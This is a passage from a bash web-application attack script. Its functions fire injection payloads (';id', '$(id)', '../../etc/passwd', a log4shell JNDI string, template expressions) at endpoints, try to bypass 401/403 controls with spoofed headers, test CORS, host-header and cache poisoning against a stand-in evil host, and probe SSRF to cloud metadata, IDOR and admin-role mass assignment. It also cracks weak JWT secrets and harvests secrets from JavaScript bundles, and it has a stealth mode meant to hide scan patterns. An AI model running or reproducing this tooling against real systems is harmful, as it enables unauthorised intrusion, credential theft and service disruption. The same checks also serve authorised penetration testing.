                && printf '  field-suggestion ENABLED at %s -> schema recoverable despite introspection off\n' "$u" >> "$res"
            # query batching (array of queries) -> auth/rate-limit bypass + DoS amplification
            local bat; bat=$(curl -sk -m 8 "${_RETRY[@]}" -X POST -H 'Content-Type: application/json' "${_CA[@]}" \
                --data '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]' "$u" 2>/dev/null)
            [ "$(printf '%s' "$bat" | grep -o '__typename' | wc -l)" -ge 2 ] 2>/dev/null \
                && printf '  query BATCHING enabled at %s -> rate-limit/brute bypass + DoS amplification\n' "$u" >> "$res"
        fi
    done
    [ -s "$res" ] || echo "no GraphQL endpoint responded"
}

# Probe HTTP methods per discovered endpoint (OPTIONS Allow header + verb sweep).
method_probe() {
    local eps="$1"
    local map="$OUTDIR/raw/method-map.txt"; : > "$map"
    _curl_auth
    [ -s "$eps" ] || { echo "no endpoints to method-probe"; return 0; }
    local u code allow m
    local i=0
    while read -r u; do
        [ -z "$u" ] && continue
        i=$((i+1)); [ "$i" -gt 60 ] && break
        _jitter
        allow=$(curl -sk -m 8 "${_RETRY[@]}" -X OPTIONS -D - -o /dev/null "${_CA[@]}" "$u" 2>/dev/null \
                | grep -iE '^allow:' | head -1 | tr -d '\r')
        for m in GET POST PUT PATCH DELETE; do
            code=$(curl -sk -m 8 "${_RETRY[@]}" -o /dev/null -w '%{http_code}' -X "$m" "${_CA[@]}" "$u" 2>/dev/null)
            [ "${code:0:1}" = "2" ] || [ "$code" = 405 ] || continue
            printf '%s %s -> %s\n' "$m" "$u" "$code" >> "$map"
        done
        [ -n "$allow" ] && printf '%s (%s)\n' "$u" "$allow" >> "$map"
    done < "$eps"
    [ -s "$map" ] || echo "no methods mapped"
}

# ---- 500 provocation: hammer endpoints with malformed input across verbs/bodies.
provoke500() {
    local apis="$1" params="$2"
    local csv="$OUTDIR/raw/break500-deep.csv"
    local bodies="$OUTDIR/raw/break500-bodies"; mkdir -p "$bodies"
    printf 'status,method,ctype,class,url\n' > "$csv"
    _curl_auth

    local big; big=$(printf 'A%.0s' $(seq 1 8000))
    local deep_open deep_close nested hugearr
    deep_open=$(printf '{"a":%.0s' $(seq 1 300)); deep_close=$(printf '}%.0s' $(seq 1 300))
    nested="${deep_open}1${deep_close}"
    hugearr="[$(printf '0,%.0s' $(seq 1 3000))0]"

    # scalar payload battery (single-quoted -> no expansion of $ ` etc.)
    local -a PAY=(
        "'" '"' '\' '%00' '%0a%0d' '%09' '../../../../../../etc/passwd'
        '....//....//....//etc/passwd' '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
        '-1' '0' '2147483648' '4294967296' '99999999999999999999999999999'
        '1e400' 'NaN' 'Infinity' '0x41414141' 'null' 'true' 'undefined'
        '[]' '{}' '{{7*7}}' '${7*7}' '<%=7*7%>' '#{7*7}' '*{7*7}'
        '${jndi:ldap://127.0.0.1:1/a}' '%s%s%s%s%s%n%n' ';id' '|id' '`id`'
        '$(id)' '&&id' "$big"
    )

    # in stealth, randomize endpoint order (shuf) so traffic has no scan-like pattern
    local _order="cat"; [ "$STEALTH" = 1 ] && have shuf && _order="shuf"
    local endpoints; endpoints=$( { [ -s "$params" ] && cat "$params"; \
                                    [ -s "$apis" ] && cat "$apis"; echo "$BASEURL"; } \
                                  | sort -u | $_order | head -n 80 )
    local n=0 t_start=$SECONDS t_max=$(( DURATION * 6 )) budget=$(( DURATION * 40 ))

    _hit() { # method ctype class url [data]
        local m="$1" ct="$2" cls="$3" url="$4" data="${5:-}" code out
        out=$(mktemp 2>/dev/null) || return 0
        local -a c=(curl -sk -g -o "$out" -w '%{http_code}' -m 12 -X "$m" "${_CA[@]}")
        [ -n "$ct" ] && c+=(-H "Content-Type: $ct")
        [ -n "$data" ] && c+=(--data-binary "$data")
        c+=("$url")
        code=$("${c[@]}" 2>/dev/null)
        n=$((n+1))
        if [ "${code:0:1}" = "5" ]; then
            printf '%s,%s,%s,%s,%s\n' "$code" "$m" "${ct:-none}" "$cls" "$url" >> "$csv"
            head -c 4000 "$out" > "$bodies/$(printf '%s-%s' "$code" "$(printf '%s%s%s' "$m" "$cls" "$url" | md5sum | cut -c1-12)").txt" 2>/dev/null
        fi
        rm -f "$out"
        # pace: big random jitter in stealth, else fixed 1/RATE gap if a rate is set
        if [ "$PROBE_JITTER" -gt 0 ] 2>/dev/null; then _jitter
        elif [ "$RATE" -gt 0 ] 2>/dev/null; then sleep "$(awk -v r="$RATE" 'BEGIN{printf "%.3f",1/r}')" 2>/dev/null || true; fi
    }

    local u fuzzed base qs newqs kv key
    local -a parts
    while IFS= read -r u; do
        [ -z "$u" ] && continue
        [ "$n" -ge "$budget" ] && { echo "[provoke500] request budget reached ($budget)"; break; }
        [ $((SECONDS - t_start)) -ge "$t_max" ] && { echo "[provoke500] time budget reached (${t_max}s)"; break; }

        # ---- structural probes (guaranteed per endpoint) ----
        _hit POST 'application/json'  malformed-json    "$u" '{"x":'
        _hit POST 'application/json'  malformed-json    "$u" '{"x":"unterminated'
        _hit POST 'application/json'  malformed-json    "$u" '[1,2,'
        _hit POST 'application/json'  empty-json-body   "$u" ''
        _hit POST 'application/json'  deep-nested-json  "$u" "$nested"
        _hit POST 'application/json'  huge-array-json   "$u" "$hugearr"
        _hit POST 'application/json'  type-confusion    "$u" '{"id":[1,2,3],"name":{"$ne":null}}'
        _hit POST 'application/json'  oversized-json    "$u" "{\"x\":\"$big\"}"
        _hit POST 'application/xml'   wrong-ctype-xml   "$u" '{"still":"json"}'
        _hit POST 'application/json'  ctype-lies-form   "$u" 'a=1&b=2'
        _hit POST 'text/plain'       raw-null-body     "$u" '%00%00%00'
        # verb tampering on the raw endpoint
        for m in PUT PATCH DELETE TRACE CONNECT OPTIONS FOOBAR "GET/../"; do
            _hit "$m" '' method-tamper "$u"
        done

        # ---- scalar payload sweep (query + JSON scalar) ----
        for p in "${PAY[@]}"; do
            [ "$n" -ge "$budget" ] && break
            [ $((SECONDS - t_start)) -ge "$t_max" ] && break
            if [[ "$u" == *\?* ]]; then
                base="${u%%\?*}"; qs="${u#*\?}"; newqs=""
                IFS='&' read -ra parts <<< "$qs"
                for kv in "${parts[@]}"; do key="${kv%%=*}"; newqs+="${key}=${p}&"; done
                fuzzed="${base}?${newqs%&}"
            else
                fuzzed="${u%/}?sf=${p}"
            fi
            _hit GET  '' query-scalar "$fuzzed"
            _hit POST 'application/json' json-scalar "$u" "{\"sf\":\"${p//\"/\\\"}\"}"
        done
        # oversized header + malformed Range (once per endpoint)
        curl -sk -g -o /dev/null -w '%{http_code}' -m 10 "${_CA[@]}" \
            -H "X-Sf-Overflow: $big" -H 'Range: bytes=0-,-1,999999999999-' "$u" 2>/dev/null \
            | awk '$0 ~ /^5/ {print "5xx,GET,none,bad-header-range,'"$u"'"}' >> "$csv"
        n=$((n+1))
    done <<< "$endpoints"

    local hits; hits=$(( $(wc -l < "$csv") - 1 ))
    printf '[provoke500] sent ~%s requests, %s x 5xx recorded\n' "$n" "$hits"
}

# ---- 401/403 access-control bypass probe (header + path tricks).
bypass_probe() {
    local eps="$1"
    local out="$OUTDIR/raw/bypass.txt"; : > "$out"
    _curl_auth
    [ -s "$eps" ] || { echo "no endpoints to test for 403/401 bypass"; return 0; }
    local u base host path code len i=0
    host="${HOST}"
    # report a bypass only if it's a success code AND the body differs from the
    # catch-all baseline (kills false positives on wildcard-200 servers).
    _try() { # label extra-curl-args... url
        local label="$1"; shift
        _jitter
        read -r code len _ <<< "$(_probe "${@: -1}" "${@:1:$#-1}")"
        case "$code" in 200|201|204|301|302|307) _differs "$code" "$len" && printf '  BYPASS %s (%sB) via %s\n' "$code" "$len" "$label" >> "$out";; esac
    }
    while IFS= read -r u; do
        [ -z "$u" ] && continue
        i=$((i+1)); [ "$i" -gt 50 ] && break
        _jitter
        read -r code len _ <<< "$(_probe "$u")"
        [ "$code" = 401 ] || [ "$code" = 403 ] || continue
        base="${u%%\?*}"; path="/${base#*://*/}"; [ "$path" = "/$base" ] && path="/"
        printf '\n[%s] baseline %s\n' "$code" "$u" >> "$out"
        local h
        for h in "X-Forwarded-For: 127.0.0.1" "X-Forwarded-Host: $host" \
                 "X-Originating-IP: 127.0.0.1" "X-Remote-IP: 127.0.0.1" \
                 "X-Client-IP: 127.0.0.1" "X-Host: 127.0.0.1" \
                 "X-Custom-IP-Authorization: 127.0.0.1" \
                 "X-Original-URL: $path" "X-Rewrite-URL: $path" \
                 "Referer: ${SCHEME}://${host}/" "X-Forwarded-Scheme: http"; do
            _try "header {$h}" -H "$h" "$u"
        done
        local v
        for v in "${base}/" "${base}/." "${base}//" "${base}/./" "${base}%20" "${base}%09" \
                 "${base}?" "${base}#" "${base}/..;/" "${base}/%2e/" "${base}.json" \
                 "$(printf '%s' "$base" | sed 's#/\([^/]*\)$#/\U\1#')"; do
            _try "path {$v}" "$v"
        done
    done < "$eps"
    grep -q BYPASS "$out" 2>/dev/null || echo "no 403/401 bypass found" >> "$out"
}

# ---- CORS / Host-header injection / security.txt misconfiguration checks.
misconfig_probe() {
    local out="$OUTDIR/raw/misconfig.txt"; : > "$out"
    local base="${SCHEME}://${HOST}:${PORT}"
    _curl_auth
    local hdrs evil="https://evil.sf-probe.example"

    # --- CORS reflection ---
    printf '== CORS ==\n' >> "$out"
    local target u
    { echo "$BASEURL"; [ -s "$OUTDIR/raw/api-urls.txt" ] && head -8 "$OUTDIR/raw/api-urls.txt"; } | sort -u | while read -r target; do
        [ -z "$target" ] && continue
        _jitter
        hdrs=$(curl -sk -m 8 "${_RETRY[@]}" -D - -o /dev/null "${_CA[@]}" -H "Origin: $evil" "$target" 2>/dev/null | tr -d '\r')
        local acao acac
        acao=$(printf '%s' "$hdrs" | grep -i '^access-control-allow-origin:' | head -1)
        acac=$(printf '%s' "$hdrs" | grep -i '^access-control-allow-credentials:' | head -1)
        if printf '%s' "$acao" | grep -qiE "$evil|\*"; then
            printf 'CORS reflects origin: %s\n  %s\n  %s\n' "$target" "$acao" "${acac:-（no ACAC）}" >> "$out"
            printf '%s' "$acac" | grep -qi 'true' && printf '  !! reflected origin WITH credentials=true (exploitable)\n' >> "$out"
        fi
    done

    # --- Host header injection ---
    printf '\n== Host-header injection ==\n' >> "$out"
    local body loc
    for h in "Host: $evil" "X-Forwarded-Host: $evil" "X-Host: $evil" "X-Forwarded-Server: $evil"; do
        _jitter
        body=$(curl -sk -m 8 "${_RETRY[@]}" -D "$OUTDIR/raw/.hh" "${_CA[@]}" -H "$h" "$base/" 2>/dev/null)
        loc=$(grep -iE '^(location|content-location):' "$OUTDIR/raw/.hh" 2>/dev/null | tr -d '\r')
        if printf '%s\n%s' "$loc" "$body" | grep -q "evil.sf-probe.example"; then
            printf 'Host header {%s} reflected into response/redirect:\n  %s\n' "$h" "${loc:-in body}" >> "$out"
        fi
    done
    rm -f "$OUTDIR/raw/.hh"

    # --- unkeyed-header web cache poisoning (reflection + cacheability) ---
    printf '\n== Cache poisoning (unkeyed input) ==\n' >> "$out"
    local cb="sfcache=${RANDOM}${RANDOM}" cacheable
    for h in "X-Forwarded-Host: evil.sf-probe.example" "X-Host: evil.sf-probe.example" "X-Forwarded-Scheme: nothttps"; do
        _jitter
        hdrs=$(curl -sk -m 8 "${_RETRY[@]}" -D - "${_CA[@]}" -H "$h" "${base}/?${cb}" 2>/dev/null)
        if printf '%s' "$hdrs" | grep -q 'evil.sf-probe.example'; then
            cacheable=$(printf '%s' "$hdrs" | grep -iE '^(age|x-cache|cf-cache-status|x-cache-hits):' | tr -d '\r' | head -1)
            if [ -n "$cacheable" ]; then printf 'CACHE-POISONING risk: unkeyed {%s} reflected AND cacheable (%s)\n' "$h" "$cacheable" >> "$out"
            else printf 'unkeyed header {%s} reflected (cacheability unconfirmed)\n' "$h" >> "$out"; fi
        fi
    done

    # --- security.txt / well-known (baseline-aware to avoid catch-all false positives) ---
    printf '\n== .well-known / security.txt ==\n' >> "$out"
    local code len
    for p in .well-known/security.txt security.txt .well-known/change-password \
             .well-known/openid-configuration .well-known/assetlinks.json; do
        _jitter
        read -r code len _ <<< "$(_probe "$base/$p")"
        [ "$code" = 200 ] && _differs "$code" "$len" && printf 'present: /%s (HTTP 200, %sB)\n' "$p" "$len" >> "$out"
    done

    grep -qE 'reflects|reflected|present:|CACHE-POISONING|unkeyed' "$out" 2>/dev/null || echo "no CORS/host-header/cache/well-known findings" >> "$out"
}

# ---- active injection verified by RESPONSE CONTENT (SSTI/cmdi/traversal/SQLerr/SSRF).
# Not gated by --dos (light, non-destructive) EXCEPT time-based blind tests.
inject_verify() {
    local params="$1"
    local out="$OUTDIR/raw/inject-verified.txt"; : > "$out"
    _curl_auth
    local targets; targets=$( { [ -s "$params" ] && cat "$params"; echo "$BASEURL"; } | sort -u | head -n 40 )
    [ -z "$targets" ] && { echo "no parameterized endpoints to verify"; return 0; }

    local marker="sfti9317"
    _send() { # url method ctype data -> body to stdout
        local url="$1" m="$2" ct="$3" data="$4"
        local -a c=(curl -sk -g -m 12 "${_RETRY[@]}" -X "$m" "${_CA[@]}")
        [ -n "$ct" ] && c+=(-H "Content-Type: $ct")
        [ -n "$data" ] && c+=(--data-binary "$data")
        c+=("$url"); "${c[@]}" 2>/dev/null
    }
    _fuzz_query() { # url payload -> url with every param value replaced by payload
        local u="$1" p="$2" base qs newqs kv key; local -a parts
        if [[ "$u" == *\?* ]]; then
            base="${u%%\?*}"; qs="${u#*\?}"; newqs=""
            IFS='&' read -ra parts <<< "$qs"
            for kv in "${parts[@]}"; do key="${kv%%=*}"; newqs+="${key}=${p}&"; done
            printf '%s?%s' "$base" "${newqs%&}"
        else printf '%s?sf=%s' "${u%/}" "$p"; fi
    }

    local u body expr cmd trav ss t0 t1 dt
    local t_start=$SECONDS t_max=$(( DURATION * 6 ))
    while IFS= read -r u; do
        [ -z "$u" ] && continue
        [ $((SECONDS - t_start)) -ge "$t_max" ] && { echo "[inject_verify] time budget reached"; break; }
        _jitter
        # SSTI: <marker>{{7*7}}zz -> <marker>49zz in body (proves evaluation)
        for expr in '{{7*7}}' '${7*7}' '#{7*7}' '<%=7*7%>' '${{7*7}}'; do
            body=$(_send "$(_fuzz_query "$u" "${marker}${expr}zz")" GET '' '')
            printf '%s' "$body" | grep -q "${marker}49zz" && { printf 'SSTI CONFIRMED (%s -> 49) : %s\n' "$expr" "$u" >> "$out"; break; }
        done
        body=$(_send "$u" POST 'application/json' "{\"sf\":\"${marker}{{7*7}}zz\"}")
        printf '%s' "$body" | grep -q "${marker}49zz" && printf 'SSTI CONFIRMED (json {{7*7}}) : %s\n' "$u" >> "$out"

        # OS command injection: uid=NNN( in output
        for cmd in ';id' '|id' '`id`' '$(id)' '%0aid'; do
            body=$(_send "$(_fuzz_query "$u" "$cmd")" GET '' '')
            printf '%s' "$body" | grep -qE 'uid=[0-9]+\(' && { printf 'OS-COMMAND-INJECTION CONFIRMED (%s -> uid=) : %s\n' "$cmd" "$u" >> "$out"; break; }
        done

        # Path traversal: root:x:0:0 in output
        for trav in '../../../../../../etc/passwd' '....//....//....//....//etc/passwd' \
                    '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd' '/etc/passwd'; do
            body=$(_send "$(_fuzz_query "$u" "$trav")" GET '' '')
            printf '%s' "$body" | grep -qE 'root:.*:0:0:' && { printf 'PATH-TRAVERSAL CONFIRMED (%s -> /etc/passwd) : %s\n' "$trav" "$u" >> "$out"; break; }
        done

        # SQL error signatures (confirm with sqlmap)
        body=$(_send "$(_fuzz_query "$u" "sf'\"\`(")" GET '' '')
        printf '%s' "$body" | grep -qiE "SQL syntax|mysql_fetch|valid MySQL result|ORA-[0-9]{5}|PostgreSQL.*ERROR|SQLite3?::|Unclosed quotation|Microsoft OLE DB|ODBC .*SQL|syntax error at or near|SQLSTATE\[" \
            && printf 'SQL-ERROR reflected (probable SQLi) : %s\n' "$u" >> "$out"

        # SSRF (needs --collab for OOB; metadata reflection detected inline)
        if [ -n "$COLLAB_HOST" ]; then
            for ss in "http://${COLLAB_HOST}/sf" "http://169.254.169.254/latest/meta-data/"; do
                body=$(_send "$(_fuzz_query "$u" "$ss")" GET '' '')
                printf '%s' "$body" | grep -qiE 'ami-id|instance-id|iam/security-credentials|computeMetadata|access_key' \
                    && printf 'SSRF CONFIRMED (cloud metadata reflected via %s) : %s\n' "$ss" "$u" >> "$out"
            done
            printf 'SSRF payloads (collab=%s) sent - check collaborator for OOB: %s\n' "$COLLAB_HOST" "$u" >> "$OUTDIR/raw/ssrf-oob.txt"
        fi

        # Blind time-based (adds latency/load) -> only under --dos
        if [ "$DOS" = 1 ]; then
            t0=$(date +%s%N)
            _send "$(_fuzz_query "$u" ';sleep 5')" GET '' '' >/dev/null
            t1=$(date +%s%N); dt=$(( (t1 - t0) / 1000000 ))
            [ "$dt" -gt 4500 ] && printf 'BLIND-CMDI time-based (;sleep 5 -> %sms) : %s\n' "$dt" "$u" >> "$out"
        fi
    done <<< "$targets"
    [ -z "$COLLAB_HOST" ] && echo "note: no --collab set - blind SSRF/RCE/log4shell OOB detection disabled" >> "$out"
    grep -qE 'CONFIRMED|reflected' "$out" 2>/dev/null || echo "no injection confirmed via response evidence" >> "$out"
}

# ---- API authorization: IDOR/BOLA, BFLA, object enumeration, mass assignment.
authz_probe() {
    local eps="$1"
    local out="$OUTDIR/raw/authz.txt"; : > "$out"
    _curl_auth
    local -a A=("${_CA[@]}")
    local -a B=(); [ -n "$COOKIE2" ] && B+=(-b "$COOKIE2"); [ -n "$HEADER2" ] && B+=(-H "$HEADER2"); [ -n "$UA" ] && B+=(-A "$UA")
    local have_b=0; [ -n "$COOKIE2$HEADER2" ] && have_b=1
    [ -s "$eps" ] || { echo "no endpoints for authz testing"; return 0; }

    _pget() { # url [curl-identity-args...] -> "status size"
        local url="$1"; shift; local o c
        o=$(mktemp 2>/dev/null) || { echo "000 0"; return; }
        c=$(curl -sk -m 8 "${_RETRY[@]}" -o "$o" -w '%{http_code} %{size_download}' "$@" "$url" 2>/dev/null)
        rm -f "$o"; echo "${c:-000 0}"
    }

    local u i=0 sa la sb lb s1 l1 proto rest authority pathpart fnum inc alt1 alt2
    while IFS= read -r u; do
        [ -z "$u" ] && continue
        i=$((i+1)); [ "$i" -gt 60 ] && break
        _jitter

        # --- BFLA / broken-authz: privileged-looking path reachable by low-priv/unauth ---
        if printf '%s' "$u" | grep -qiE '/admin|/manage|/internal|/config|/delete|/users?/|/accounts?/|/settings|/private|/debug'; then
            read -r sa la <<< "$(_pget "$u" "${A[@]}")"
            if [ "$have_b" = 1 ]; then
                read -r sb lb <<< "$(_pget "$u" "${B[@]}")"
                case "$sb" in 200|201|204) printf 'BFLA: low-priv identity got HTTP %s (%sB) on privileged %s  [primary=%s]\n' "$sb" "$lb" "$u" "$sa" >> "$out";; esac
            else
                read -r sb lb <<< "$(_pget "$u")"
                case "$sb" in 200|201|204) printf 'BROKEN-AUTHZ: unauthenticated got HTTP %s (%sB) on privileged %s\n' "$sb" "$lb" "$u" >> "$out";; esac
            fi
        fi

        # --- IDOR/BOLA + object enumeration on numeric ids ---
        if printf '%s' "$u" | grep -qE '/[0-9]+(/|$|\?)|[?&][A-Za-z_]*id=[0-9]+'; then
            proto="${u%%://*}"; rest="${u#*://}"; authority="${rest%%/*}"
            pathpart="/${rest#*/}"; [ "$pathpart" = "/$rest" ] && pathpart=""
            fnum=$(printf '%s' "$pathpart" | grep -oE '[0-9]+' | head -1)
            if [ -n "$fnum" ]; then
                inc=$((fnum+1))
                alt1="${proto}://${authority}${pathpart/$fnum/$inc}"
                alt2="${proto}://${authority}${pathpart/$fnum/1}"
                read -r sa la <<< "$(_pget "$u" "${A[@]}")"
                read -r s1 l1 <<< "$(_pget "$alt1" "${A[@]}")"
                # neighbouring object returns valid, differently-sized data -> enumeration
                if [ "$s1" = 200 ] && [ "${l1:-0}" -gt 0 ] && [ "$l1" != "$la" ]; then
                    printf 'OBJECT-ENUMERATION: %s and neighbour id return distinct 200 bodies (%sB vs %sB) - probable BOLA\n' "$u" "$la" "$l1" >> "$out"
                fi
                # confirmed IDOR: second identity reads first identity's object
                if [ "$have_b" = 1 ]; then
                    read -r sb lb <<< "$(_pget "$u" "${B[@]}")"
                    if [ "$sb" = 200 ] && [ "${lb:-0}" -gt 0 ]; then
                        local diff=$(( lb - la )); [ "$diff" -lt 0 ] && diff=$(( -diff ))
                        # relative tolerance: 5% of object size + 32B floor (handles dynamic fields)
                        local tol=$(( la / 20 + 32 ))
                        [ "$diff" -le "$tol" ] && printf 'IDOR CONFIRMED: second identity reads first identity object %s (HTTP %s, %sB ~ %sB)\n' "$u" "$sb" "$lb" "$la" >> "$out"
                    fi
                fi
            fi
        fi

        # --- mass assignment: privileged fields accepted on write endpoints ---
        # Hardened: compare a benign PUT baseline vs a privileged PUT. Only flag when
        # the priv write is accepted AND either reflects an injected field or the
        # response meaningfully differs from the benign baseline (cuts blanket-200 FPs).
        if printf '%s' "$u" | grep -qiE '/api/|/v[0-9]+/|/users?|/account|/profile|/settings'; then
            local ma bo bs bl ps pl pf
            ma='{"role":"admin","isAdmin":true,"is_admin":true,"is_staff":true,"account_balance":999999}'
            bo=$(mktemp 2>/dev/null); pf=$(mktemp 2>/dev/null)
            read -r bs bl < <(curl -sk -g -m 8 "${_RETRY[@]}" -o "$bo" -w '%{http_code} %{size_download}' -X PUT -H 'Content-Type: application/json' "${A[@]}" --data '{"sf_benign":"1"}' "$u" 2>/dev/null)
            read -r ps pl < <(curl -sk -g -m 8 "${_RETRY[@]}" -o "$pf" -w '%{http_code} %{size_download}' -X PUT -H 'Content-Type: application/json' "${A[@]}" --data "$ma" "$u" 2>/dev/null)
            case "$ps" in 200|201|204)
                if grep -qiE '"(role|isAdmin|is_admin|is_staff|account_balance)"' "$pf" 2>/dev/null; then
                    printf 'MASS-ASSIGN LIKELY: priv fields reflected in response on %s (HTTP %s)\n' "$u" "$ps" >> "$out"
                elif [ "$bs" = "$ps" ] && [ "${pl:-0}" != "${bl:-0}" ]; then
                    printf 'MASS-ASSIGN? priv PUT differs from benign baseline (%sB vs %sB) on %s - verify effect\n' "$pl" "$bl" "$u" >> "$out"
                fi ;;
            esac
            rm -f "$bo" "$pf"
        fi
    done < "$eps"

    [ "$have_b" = 1 ] || echo "note: pass --cookie2/--header2 (a second, lower-privileged session) to confirm IDOR/BFLA cross-user" >> "$out"
    grep -qE 'IDOR|BFLA|BROKEN-AUTHZ|ENUMERATION|MASS-ASSIGN' "$out" 2>/dev/null || echo "no authorization flaws detected" >> "$out"
}

# ---- open redirect probe.
openredirect_probe() {
    local params="$1"
    local out="$OUTDIR/raw/openredirect.txt"; : > "$out"
    _curl_auth
    local evil='https://evil.sf-probe.example'
    local targets; targets=$( { [ -s "$params" ] && cat "$params"; echo "$BASEURL"; } | sort -u | head -n 40)
    local redir_params='url redirect redirect_uri redirect_url redirectUrl next returnUrl return_url return dest destination continue goto callback rurl u'
    local u base qs newqs kv key rp loc n=0; local -a parts test_urls
    while IFS= read -r u; do
        [ -z "$u" ] && continue
        [ "$n" -ge 400 ] && break
        _jitter
        test_urls=()
        if [[ "$u" == *\?* ]]; then
            base="${u%%\?*}"; qs="${u#*\?}"; newqs=""; IFS='&' read -ra parts <<< "$qs"
            for kv in "${parts[@]}"; do key="${kv%%=*}"; newqs+="${key}=${evil}&"; done
            test_urls+=("${base}?${newqs%&}")
        else
            for rp in $redir_params; do test_urls+=("${u%/}?${rp}=${evil}" "${u%/}?${rp}=//evil.sf-probe.example"); done
        fi
        for t in "${test_urls[@]}"; do
            n=$((n+1))
            loc=$(curl -sk -m 8 "${_RETRY[@]}" -D - -o /dev/null "${_CA[@]}" "$t" 2>/dev/null | grep -iE '^location:' | tr -d '\r' | head -1)
            printf '%s' "$loc" | grep -qiE 'https?://evil\.sf-probe\.example|//evil\.sf-probe\.example' \
                && printf 'OPEN-REDIRECT: %s\n  -> %s\n' "$t" "$loc" >> "$out"
        done
    done <<< "$targets"
    grep -q OPEN-REDIRECT "$out" 2>/dev/null || echo "no open redirect found" >> "$out"
}

# ---- JWT discovery + analysis (alg:none, weak HS256 secret, expiry, authz claims).
jwt_probe() {
    local out="$OUTDIR/raw/jwt.txt"; : > "$out"
    local toks="$OUTDIR/raw/jwt-tokens.txt"; : > "$toks"
    printf '%s\n%s\n%s\n' "$COOKIE" "$HEADER" "$COOKIE2$HEADER2" \
        | grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' >> "$toks" 2>/dev/null
    _curl_auth
    if [ -s "$OUTDIR/urls.txt" ]; then
        head -30 "$OUTDIR/urls.txt" | while read -r u; do _jitter; curl -sk -m 6 "${_RETRY[@]}" -D - "${_CA[@]}" "$u" 2>/dev/null; done \
            | grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' >> "$toks" 2>/dev/null
    fi
    sort -u -o "$toks" "$toks" 2>/dev/null || true
    [ -s "$toks" ] || { echo "no JWT found in auth headers or crawled content"; return 0; }

    _b64url() { local s="${1//-/+}"; s="${s//_/\/}"; local m=$(( ${#s} % 4 )); [ "$m" -gt 0 ] && s="$s$(printf '%.0s=' $(seq 1 $((4-m))))"; printf '%s' "$s" | base64 -d 2>/dev/null; }
    local t h p hd pd exp now secret sig
    while read -r t; do
        [ -z "$t" ] && continue
        h="${t%%.*}"; p="${t#*.}"; p="${p%%.*}"
        hd=$(_b64url "$h"); pd=$(_b64url "$p")
        printf '\nJWT %.32s...\n  header: %s\n  claims: %.240s\n' "$t" "$hd" "$pd" >> "$out"
        printf '%s' "$hd" | grep -qiE '"alg"[[:space:]]*:[[:space:]]*"none"' && printf '  !! alg=none -> forgeable without a key\n' >> "$out"
        printf '%s' "$hd" | grep -qiE '"alg"[[:space:]]*:[[:space:]]*"HS' && printf '  HS* symmetric alg -> crack secret (hashcat -m 16500 / jwt_tool)\n' >> "$out"
        exp=$(printf '%s' "$pd" | grep -oE '"exp"[[:space:]]*:[[:space:]]*[0-9]+' | grep -oE '[0-9]+$')
        if [ -n "$exp" ]; then now=$(date +%s); [ "$exp" -lt "$now" ] && printf '  token EXPIRED (exp=%s < now=%s)\n' "$exp" "$now" >> "$out"; fi
        printf '%s' "$pd" | grep -qiE '"(admin|role|is_admin|isadmin|scope|priv|groups?)"' && printf '  carries authz claims (admin/role/scope) -> tamper candidate\n' >> "$out"
        if printf '%s' "$hd" | grep -qiE '"alg"[[:space:]]*:[[:space:]]*"HS256"' && have openssl; then
            for secret in secret password 123456 changeme jwt admin test key private secretkey supersecret your-256-bit-secret; do
                sig=$(printf '%s' "${t%.*}" | openssl dgst -sha256 -hmac "$secret" -binary 2>/dev/null | base64 2>/dev/null | tr '+/' '-_' | tr -d '=')
                [ "$sig" = "${t##*.}" ] && { printf '  !! WEAK HS256 SECRET CRACKED: "%s" -> full token forgery\n' "$secret" >> "$out"; break; }
            done
        fi
    done < "$toks"
}

# ---- JS source-map theft (.map exposure -> original source recoverable).
sourcemap_probe() {
    _curl_auth
    local out="$OUTDIR/raw/sourcemaps.txt"; : > "$out"
    local dir="$OUTDIR/raw/sourcemaps"; mkdir -p "$dir"
    [ -s "$OUTDIR/urls.txt" ] || { echo "no crawled urls"; return 0; }
    local u code f nsrc
    grep -iE '\.js(\?|$)' "$OUTDIR/urls.txt" | sed 's/?.*//' | sort -u | head -40 | while read -r u; do
        _jitter
        f="$dir/$(printf '%s' "$u" | md5sum | cut -c1-12).map"
        code=$(curl -sk -m 8 "${_RETRY[@]}" "${_CA[@]}" -o "$f" -w '%{http_code}' "${u}.map" 2>/dev/null)
        if [ "$code" = 200 ] && grep -q '"sources"' "$f" 2>/dev/null; then
            nsrc=$(grep -oE '"sources"[[:space:]]*:[[:space:]]*\[[^]]*\]' "$f" | grep -oE '"[^"]+"' | grep -cv '^"sources"$')
            printf 'SOURCE-MAP exposed: %s.map (%s source files recoverable)\n' "$u" "$nsrc" >> "$out"
        else rm -f "$f"; fi
    done
    grep -q 'SOURCE-MAP' "$out" 2>/dev/null || echo "no exposed source maps" >> "$out"
}

# ---- generic secret sweep of JS bundles (TOKEN=/Bearer/apiKey/cloud keys/JWT/PEM).
# Complements trufflehog (detectors) by catching loose hardcoded assignments.
js_secrets_probe() {
    _curl_auth
    local out="$OUTDIR/raw/js-secrets.txt"; : > "$out"
    [ -s "$OUTDIR/urls.txt" ] || { echo "no crawled urls" > "$out"; return 0; }
    local js="$OUTDIR/raw/js-blobs.txt"; : > "$js"
    grep -iE '\.js(\?|$)' "$OUTDIR/urls.txt" | sed 's/#.*//' | sort -u | head -60 | while read -r u; do
        _jitter; printf '\n/*=== %s ===*/\n' "$u"; curl -sk -m 8 "${_RETRY[@]}" "${_CA[@]}" "$u" 2>/dev/null
    done > "$js"
    [ -s "$js" ] || { echo "no JS fetched" > "$out"; return 0; }
    local tmp; tmp=$(mktemp 2>/dev/null)
    # case-insensitive: key=value assignments + bearer tokens
    grep -noiE '(bearer[[:space:]]+[a-z0-9._~+/-]{12,}=*)|((api[_-]?key|apikey|access[_-]?token|auth[_-]?token|client[_-]?secret|secret[_-]?key|secret|token|passwd|password|aws_secret_access_key)["'"'"' ]{0,3}[:=]["'"'"' ]{0,3}[a-z0-9._/+~-]{8,})' "$js" >> "$tmp" 2>/dev/null
    # case-sensitive: known cloud/provider key formats, JWTs, PEM keys
